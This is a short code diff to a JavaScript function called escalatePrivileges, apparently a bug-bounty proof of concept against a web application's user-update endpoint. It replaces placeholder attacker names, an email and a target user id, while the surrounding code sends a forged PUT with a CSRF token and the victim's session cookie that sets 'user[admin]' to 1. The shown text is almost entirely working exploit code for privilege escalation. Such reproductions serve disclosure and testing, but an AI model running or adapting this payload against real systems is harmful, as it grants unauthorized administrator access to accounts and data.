@@ -11,10 +11,10 @@ async function escalatePrivileges() {
   const body = new URLSearchParams({
     _method: "put",
     authenticity_token: csrf,
-    "user[login]": "attacker2",
-    "user[firstname]": "attacker",
-    "user[lastname]": "attacker",
-    "user[mail]": "pocrepro-ywh-6d5ea28a42d6fdc6@yeswehack.ninja",
+    "user[login]": "User1",
+    "user[firstname]": "Test",
+    "user[lastname]": "Test",
+    "user[mail]": "test@test.com",
     "user[language]": "en",
     "user[admin]": "1",
     "user[password]": "",
@@ -28,7 +28,7 @@ async function escalatePrivileges() {
   });
 
   // Replace target user id with attacker id, the id was 5 in my case
-  await fetch(`/users/5`, {
+  await fetch(`/users/13`, {
     method: "POST",
     credentials: "include", // send session cookie
     headers: {
